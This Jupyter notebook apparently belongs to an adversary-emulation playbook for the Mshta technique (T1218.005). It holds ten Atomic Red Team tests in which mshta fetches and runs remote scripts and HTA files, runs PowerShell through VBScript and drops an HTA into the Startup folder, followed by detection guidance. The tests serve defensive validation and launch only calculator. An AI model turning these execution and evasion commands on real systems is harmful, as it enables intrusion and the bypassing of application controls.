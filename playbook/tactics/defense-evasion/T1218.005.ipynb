{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3afbf9e2",
   "metadata": {},
   "source": "# T1218.005 - Mshta\nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\n\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))</code>\n\nThey may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. (Citation: LOLBAS Mshta)"
  },
  {
   "cell_type": "markdown",
   "id": "83204b69",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "74f61be8",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject",
    "Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6baeef17",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "45232021",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Mshta executes VBScript to execute malicious command",
    "Run a local VB script to run local user enumeration powershell command.\nThis attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.\nUpon execution, a new PowerShell windows will be opened that displays user information.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -noexit -file PathToAtomicsFolder\\T1218.005\\src\\powershell.ps1\"\":close\")\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "30a0d6bb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "a6ac2b72",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Mshta Executes Remote HTML Application (HTA)",
    "Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$var =Invoke-WebRequest \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta\"\n$var.content|out-file \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\nmshta \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\"\nstart-sleep -s 15\nstop-process -name \"calculator\" -Force\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c55d9622",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "3b5a0727",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nremove-item \"$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\T1218.005.hta\" -ErrorAction Ignore\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d0a27bfd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d1093ccb",
   "metadata": {},
   "source": "### Atomic Test #4 - Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement\nExecutes an HTA Application using JScript script engine using local UNC path simulating lateral movement.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f49f88b2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "73d8d584",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\\system32\\mshta.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cb5b810f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "927daa50",
   "metadata": {},
   "source": "### Atomic Test #5 - Invoke HTML Application - Jscript Engine Simulating Double Click\nExecutes an HTA Application using JScript script engine simulating double click.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6deb2ef8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a2864a7d",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0583a69e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "04381f86",
   "metadata": {},
   "source": "### Atomic Test #6 - Invoke HTML Application - Direct download from URI\nExecutes an HTA Application by directly downloading from remote URI.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "95451cff",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b2296e58",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\\system32\\mshta.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "395936da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "041964a1",
   "metadata": {},
   "source": "### Atomic Test #7 - Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler\nExecutes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b27a0dd4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "6882f579",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ef70933a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "30226939",
   "metadata": {},
   "source": "### Atomic Test #8 - Invoke HTML Application - JScript Engine with Inline Protocol Handler\nExecutes an HTA Application with JScript Engine and Inline Protocol Handler.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d379d386",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "47972e81",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\\system32\\mshta.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1816051a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "a764a864",
   "metadata": {},
   "source": "### Atomic Test #9 - Invoke HTML Application - Simulate Lateral Movement over UNC Path\nExecutes an HTA Application with Simulate lateral movement over UNC Path.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: The AtomicTestHarnesses module must be installed and Invoke-ATHHTMLApplication must be exported in the module.\n##### Check Prereq Commands:\n```powershell\n$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8c03aaab",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "24e2c1e8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\\system32\\mshta.exe```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9ac83abc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "6079cdf2",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Mshta used to Execute PowerShell",
    "Use Mshta to execute arbitrary PowerShell. Example is from the 2021 Threat Detection Report by Red Canary.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nmshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run%20\"\"powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205\"\"\"))</script>'\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8d3f16b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.005 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "d1adab3b",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\n\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}